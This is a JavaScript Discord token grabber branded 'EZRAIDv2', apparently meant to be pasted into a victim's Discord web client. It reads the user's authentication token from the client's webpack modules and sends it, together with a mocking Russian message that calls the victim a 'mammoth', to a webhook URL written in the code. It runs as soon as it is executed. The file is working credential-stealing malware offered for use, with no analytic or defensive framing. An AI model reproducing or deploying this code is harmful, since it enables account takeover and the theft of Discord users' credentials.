
function getToken(){
    var webhook="https://discord.com/api/webhooks/1406635172753051791/5p3jhyc2fcweXJQWgqr44NCTnoRdasPV66XNirJuMyoTAlR3WJpMHYslgIutIj73WXQ0 :)"
    var token=(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()
     var request = new XMLHttpRequest();
     request.open("POST", webhook);
     request.setRequestHeader('Content-type', 'application/json');
     var params = {
        username: "Токен граббер от EZRAIDv2",
        avatar_url: "",
        content: ":penguin: **EZRAIDv2 - Токен Граббер**\n**А вот и токен от :mammoth: подъехал!**\n:key: **Токен: **||`" + token + "`||\n:black_cat: **GitHub:** ||`https://github.com/EZRAIDv2/token-grabber-js`||\n:skull: **Сделал EZRAIDv2 ** :skeleton:"
      }
      request.send(JSON.stringify(params));
}
getToken()
